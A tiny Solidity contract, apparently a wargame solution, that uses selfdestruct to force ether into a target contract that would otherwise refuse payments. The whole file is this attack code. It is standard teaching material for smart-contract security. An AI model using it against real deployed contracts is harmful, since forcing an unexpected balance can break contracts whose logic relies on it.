pragma solidity ^0.4.0;

contract ForceAttack {
    constructor() public payable {

    }

    function attack(address _contractAddr) public {
        selfdestruct(_contractAddr);
    }
}